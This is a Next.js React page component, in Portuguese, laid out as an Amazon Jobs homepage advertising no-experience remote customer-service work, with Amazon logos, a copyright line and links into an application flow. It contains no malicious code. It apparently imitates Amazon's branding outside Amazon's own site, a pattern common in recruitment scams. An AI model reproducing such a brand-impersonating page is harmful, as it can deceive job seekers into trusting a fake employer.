// app/page.tsx
"use client";

import Image from "next/image";
import Link from "next/link";

export default function Home() {
  return (
    <main className="min-h-screen bg-white text-gray-900">
      {/* NAVBAR */}
      <header>
        <div className="navbar">
          {/* LOGO */}
          <div className="navbar-left">
            <Image
              src="/logo_dark.99265b07.svg"
              alt="Amazon Jobs"
              width={120}
              height={36}
              priority
            />
          </div>

          {/* LINKS CENTRALIZADOS */}
          <nav className="navbar-center">
            <a href="#como-funciona">Oportunidades de Emprego</a>
            <a href="#faq">Pesquisar todas as vagas</a>
            <a href="#">Começando</a>
            <a href="#">Minha conta</a>
          </nav>
        </div>
      </header>

      {/* HERO */}
      <section className="hero">
        <div className="hero-image">
          <Image
            src="/Masthead_3000x678_Final._CB1678999583_.jpg"
            alt="Trabalhe na Amazon"
            fill
            className="rounded object-cover"
            priority
            quality={100}
          />
        </div>
        <div className="hero-content">
          <h1>Trabalhe na Amazon sem Experiência</h1>
          {/* BOTÃO AJUSTADO */}
          <Link href="/About" className="btn-link">
            Saiba como funciona
          </Link>
        </div>
      </section>

      {/* OPORTUNIDADE */}
      <section className="oportunidade">
        <h2>Oportunidade de trabalho remoto</h2>
        <div className="card-op">
          <div className="card-img">
            <Image
              src="/CS_Remote_Associate_800x510._CB594452061_.jpg"
              alt="Atendimento ao Cliente Online"
              width={800}
              height={510}
              className="rounded"
              priority
            />
          </div>
          <div className="card-content">
            <h3>Atendimento ao Cliente Online</h3>
            <p>
              Trabalhe de casa oferecendo suporte aos clientes da Amazon. Uma
              função 100% online que não exige experiência prévia.
            </p>
            <a href="/BBJobDetails" className="btn-link">
              Leia mais sobre a função remota →
            </a>
          </div>
        </div>
      </section>

      {/* CTA */}
      <section className="cta">
        <h2>Tudo pronto para começar?</h2>
        {/* BOTÃO AJUSTADO */}
        <Link href="/jobSearch" className="btn-cta">
          Começar minha candidatura
        </Link>
      </section>

      {/* BENEFÍCIOS */}
      <section className="beneficios">
        <h2>Razões pelas quais você vai adorar trabalhar na Amazon</h2>
        <div className="beneficios-grid">
          <div className="beneficio">
            <Image
              src="/Benefits.png"
              alt="Benefícios"
              width={99}
              height={99}
            />
            <h3>Benefícios</h3>
            <p>
              Assistência médica, licença parental, formas de economizar para o
              futuro, descontos para funcionários e muito mais.
            </p>
          </div>
          <div className="beneficio">
            <Image
              src="/Our_Culture_.png"
              alt="Nossa cultura"
              width={99}
              height={99}
            />
            <h3>Nossa cultura</h3>
            <p>
              Um ambiente de trabalho seguro e inclusivo com suporte de equipe e
              gerenciamento.
            </p>
          </div>
          <div className="beneficio">
            <Image
              src="/ShiftsSchedules_100x100-01._CB1665432512_.svg"
              alt="Turnos e horários"
              width={99}
              height={99}
            />
            <h3>Turnos e horários</h3>
            <p>
              Oferecemos muitos horários e turnos para escolher o trabalho que
              se adapta ao seu estilo de vida.
            </p>
          </div>
        </div>
      </section>

      {/* FOOTER */}
      <footer className="footer">
        {/* Linha Social */}
        <div className="footer-social">
          <h4>Junte-se a nós agora</h4>
          <a href="#" aria-label="Facebook" className="social-link">
            <svg
              width="22"
              height="22"
              viewBox="0 0 448 512"
              fill="currentColor"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path d="M400 32H48A48 48 0 0 0 0 80v352a48 48 0 0 0 48 48h137.25V327.69h-63V256h63v-54.64c0-62.15 
                37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.27c-30.81 0-40.42 19.12-40.42 
                38.73V256h68.78l-11 71.69h-57.78V480H400a48 48 0 0 0 48-48V80a48 48 0 0 0-48-48z" />
            </svg>
          </a>
        </div>

        {/* Linha Colunas */}
        <div className="footer-top">
          <div className="footer-col">
            <h4>OPORTUNIDADES DE EMPREGO</h4>
            <ul>
              <li>
                <a href="#">
                  Oportunidades em Centros de Distribuição e Estações de Entrega
                </a>
              </li>
              <li>
                <a href="#">Empregos de atendimento ao cliente</a>
              </li>
              <li>
                <a href="#">Procura de emprego</a>
              </li>
            </ul>
          </div>

          <div className="footer-col">
            <h4>RECURSOS</h4>
            <ul>
              <li>
                <a href="#">Perguntas Frequentes</a>
              </li>
              <li>
                <a href="#">Fale Conosco</a>
              </li>
            </ul>
          </div>

          <div className="footer-logo">
            <Image
              src="/logo.92a0feec.svg"
              alt="Amazon Jobs"
              width={140}
              height={40}
            />
          </div>
        </div>

        {/* Linha inferior */}
        <div className="footer-bottom">
          <p className="descricao">
            A Amazon está comprometida com um ambiente de trabalho diversificado
            e inclusivo. A Amazon é uma empregadora que oferece oportunidades
            iguais e não discrimina com base em raça, nacionalidade, sexo,
            identidade de gênero, orientação sexual, deficiência, idade ou outro
            status legalmente protegido.
          </p>

          <div className="footer-legal">
            <a href="#">Aviso de privacidade</a>
            <span>© 1996–2025 Amazon.com, Inc. ou suas afiliadas</span>
          </div>
        </div>
      </footer>
    </main>
  );
}
